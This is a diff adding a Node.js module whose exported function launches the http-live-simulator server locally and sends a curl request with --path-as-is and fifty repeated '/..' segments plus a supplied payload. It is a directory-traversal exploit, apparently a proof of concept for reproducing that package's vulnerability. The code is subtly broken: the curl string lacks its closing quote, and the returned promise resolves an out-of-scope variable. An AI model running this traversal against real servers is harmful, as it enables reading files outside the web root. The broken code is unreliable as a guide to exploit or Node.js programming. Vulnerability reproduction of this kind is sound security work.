@@ -1,0 +1,32 @@
+function exploitFunction(payload) {
+  const path = require("path");
+  const { sleep } = require("sleep");
+  const { exec } = require("child_process");
+
+  const genstr = (n) => "/..".repeat(n) + payload;
+
+  let server = "node ./node_modules/http-live-simulator/bin/http-live";
+  let exe = exec(server, (error, stdout) => {
+    if (error) {
+      console.error(`Error starting server: ${error}`);
+      return;
+    }
+    sleep.sleep(2); // Wait for the server to start
+    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr(50)}`; // Use payload directly
+    exec(attack_string, (error, stdout) => {
+      if (error) {
+        console.error(`Error executing attack: ${error}`);
+        return;
+      }
+      return stdout;
+    });
+  });
+
+  return new Promise((resolve) => {
+    exe.on('close', (code) => {
+      resolve(stdout);
+    });
+  });
+}
+
+module.exports = { exploitFunction };
